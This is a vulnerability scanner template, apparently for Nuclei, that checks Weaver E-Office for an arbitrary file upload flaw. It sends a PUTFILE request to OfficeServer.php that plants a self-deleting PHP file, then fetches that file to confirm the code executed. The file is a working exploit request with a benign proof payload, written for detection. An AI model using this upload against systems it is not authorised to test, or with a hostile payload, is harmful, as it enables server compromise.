id: weaver-e-office-putfile-anyfile-upload
info:
  name: Weaver E-Office PUTFILE Arbitrary File Upload Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  tags: file-upload,e-office

variables:
  t1: '{{rand_int(1000,10000)}}'
  t2: '{{md5(t1)}}'

http:
  - id: upload-file
    method: POST
    path:
      - '{{BaseURL}}/iWebOffice/OfficeServer.php'
    headers:
      Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySIELKZKzD7vQmdsO
    body: |-
      ------WebKitFormBoundarySIELKZKzD7vQmdsO
      Content-Disposition: form-data; name="REMOTEFILE"

      {{t1}}.php
      ------WebKitFormBoundarySIELKZKzD7vQmdsO
      Content-Disposition: form-data; name="OPTION"

      PUTFILE
      ------WebKitFormBoundarySIELKZKzD7vQmdsO
      Content-Disposition: form-data; name="MsgFileBody"; filename="test.png"

      <?=md5({{t1}});unlink(__FILE__);
      ------WebKitFormBoundarySIELKZKzD7vQmdsO--
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "Fatal error"
          - "undefined function"

  - id: verify-file
    method: GET
    path:
      - '{{BaseURL}}/attachment/{{t1}}.php'
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - '{{t2}}'
